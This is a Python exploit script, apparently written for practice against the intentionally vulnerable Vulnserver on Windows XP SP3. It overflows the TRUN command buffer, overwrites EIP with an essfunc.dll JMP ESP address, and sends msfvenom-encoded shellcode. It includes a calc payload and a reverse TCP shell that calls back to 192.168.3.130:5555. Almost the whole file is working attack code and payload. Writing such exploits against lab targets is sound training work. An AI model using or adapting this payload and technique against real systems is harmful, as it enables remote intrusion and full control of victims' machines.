# Author	: RIZAL MUHAMMED [UB3RSiCK]
# Steve Bradshaw's Vulnserver PoC
# Windows XP SP3
# 28-12-2017

import sys
import struct
from socket import create_connection as cc

def p(a):
	return struct.pack("I", a)

if len(sys.argv) < 2:
	print 'Usage : {} TARGET_IP'.format(sys.argv[0])
	sys.exit()

host = str(sys.argv[1])
port = 9999

# msfvenom -p windows/exec CMD=calc -f c -b "\x00\x20" -e x86/shikata_ga_nai
# 216 bytes
shellcode_calc = (
"\xda\xd2\xd9\x74\x24\xf4\xb8\xac\xd1\xaf\xb3\x5e\x29\xc9\xb1"
"\x30\x83\xee\xfc\x31\x46\x14\x03\x46\xb8\x33\x5a\x4f\x28\x31"
"\xa5\xb0\xa8\x56\x2f\x55\x99\x56\x4b\x1d\x89\x66\x1f\x73\x25"
"\x0c\x4d\x60\xbe\x60\x5a\x87\x77\xce\xbc\xa6\x88\x63\xfc\xa9"
"\x0a\x7e\xd1\x09\x33\xb1\x24\x4b\x74\xac\xc5\x19\x2d\xba\x78"
"\x8e\x5a\xf6\x40\x25\x10\x16\xc1\xda\xe0\x19\xe0\x4c\x7b\x40"
"\x22\x6e\xa8\xf8\x6b\x68\xad\xc5\x22\x03\x05\xb1\xb4\xc5\x54"
"\x3a\x1a\x28\x59\xc9\x62\x6c\x5d\x32\x11\x84\x9e\xcf\x22\x53"
"\xdd\x0b\xa6\x40\x45\xdf\x10\xad\x74\x0c\xc6\x26\x7a\xf9\x8c"
"\x61\x9e\xfc\x41\x1a\x9a\x75\x64\xcd\x2b\xcd\x43\xc9\x70\x95"
"\xea\x48\xdc\x78\x12\x8a\xbf\x25\xb6\xc0\x2d\x31\xcb\x8a\x3b"
"\xc4\x59\xb1\x09\xc6\x61\xba\x3d\xaf\x50\x31\xd2\xa8\x6c\x90"
"\x97\x47\x27\xb9\xb1\xcf\xee\x2b\x80\x8d\x10\x86\xc6\xab\x92"
"\x23\xb6\x4f\x8a\x41\xb3\x14\x0c\xb9\xc9\x05\xf9\xbd\x7e\x25"
"\x28\xde\xe1\xb5\xb0\x21")

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.3.130 LPORT=5555 EXITFUNC=thread -f c -b "\x00\x20" -e x86/shikata_ga_nai
# 351 bytes
shellcode_rev_shell = ("\xbe\xfe\x65\x33\xcf\xdb\xc2\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x52\x31\x73\x12\x83\xc3\x04\x03\x8d\x6b\xd1\x3a\x8d\x9c\x97"
"\xc5\x6d\x5d\xf8\x4c\x88\x6c\x38\x2a\xd9\xdf\x88\x38\x8f\xd3"
"\x63\x6c\x3b\x67\x01\xb9\x4c\xc0\xac\x9f\x63\xd1\x9d\xdc\xe2"
"\x51\xdc\x30\xc4\x68\x2f\x45\x05\xac\x52\xa4\x57\x65\x18\x1b"
"\x47\x02\x54\xa0\xec\x58\x78\xa0\x11\x28\x7b\x81\x84\x22\x22"
"\x01\x27\xe6\x5e\x08\x3f\xeb\x5b\xc2\xb4\xdf\x10\xd5\x1c\x2e"
"\xd8\x7a\x61\x9e\x2b\x82\xa6\x19\xd4\xf1\xde\x59\x69\x02\x25"
"\x23\xb5\x87\xbd\x83\x3e\x3f\x19\x35\x92\xa6\xea\x39\x5f\xac"
"\xb4\x5d\x5e\x61\xcf\x5a\xeb\x84\x1f\xeb\xaf\xa2\xbb\xb7\x74"
"\xca\x9a\x1d\xda\xf3\xfc\xfd\x83\x51\x77\x13\xd7\xeb\xda\x7c"
"\x14\xc6\xe4\x7c\x32\x51\x97\x4e\x9d\xc9\x3f\xe3\x56\xd4\xb8"
"\x04\x4d\xa0\x56\xfb\x6e\xd1\x7f\x38\x3a\x81\x17\xe9\x43\x4a"
"\xe7\x16\x96\xdd\xb7\xb8\x49\x9e\x67\x79\x3a\x76\x6d\x76\x65"
"\x66\x8e\x5c\x0e\x0d\x75\x37\xf1\x7a\x76\x45\x99\x78\x78\x5c"
"\xe9\xf4\x9e\x34\x1d\x51\x09\xa1\x84\xf8\xc1\x50\x48\xd7\xac"
"\x53\xc2\xd4\x51\x1d\x23\x90\x41\xca\xc3\xef\x3b\x5d\xdb\xc5"
"\x53\x01\x4e\x82\xa3\x4c\x73\x1d\xf4\x19\x45\x54\x90\xb7\xfc"
"\xce\x86\x45\x98\x29\x02\x92\x59\xb7\x8b\x57\xe5\x93\x9b\xa1"
"\xe6\x9f\xcf\x7d\xb1\x49\xb9\x3b\x6b\x38\x13\x92\xc0\x92\xf3"
"\x63\x2b\x25\x85\x6b\x66\xd3\x69\xdd\xdf\xa2\x96\xd2\xb7\x22"
"\xef\x0e\x28\xcc\x3a\x8b\x48\x2f\xee\xe6\xe0\xf6\x7b\x4b\x6d"
"\x09\x56\x88\x88\x8a\x52\x71\x6f\x92\x17\x74\x2b\x14\xc4\x04"
"\x24\xf1\xea\xbb\x45\xd0")


# 14 Bytes
jump_back = ("\x83\xEC\x64"
	     "\x83\xEC\x64"
	     "\x83\xEC\x64"
	     "\x83\xEC\x64"
	     "\xFF\xE4")

# SUB ESP, 0x64
# SUB ESP, 0x64
# SUB ESP, 0x64
# SUB ESP, 0x64
# JMP ESP

# 400 Bytes of space, just enough to contain the shellcode


try:
	sock = cc((host, port))
except:
	print "Connection Error\n"
	sys.exit()

# Grab the banner
banner = sock.recv(1024)
print "Connected to ", host
print banner

payload = "TRUN /.:/"

# EIP Overwrite at 2003
payload += "A"*(2003-400) + "\x90"*20 + shellcode_rev_shell + "\x90"*29

# essfunc.dll
# 625011AF
ret = 0x625011AF

payload += p(ret)

# We have enough space controlled by us pointed by ESP.
# But to practice jump back, assume only 50 byte available at location pointed by ESP

payload +=  "\x90"*5 + jump_back + "\x90"*10


print "Sending UB3R Payl0ad :D"
sock.send(payload)
print "One Reverse Shell Coming Right Up..."
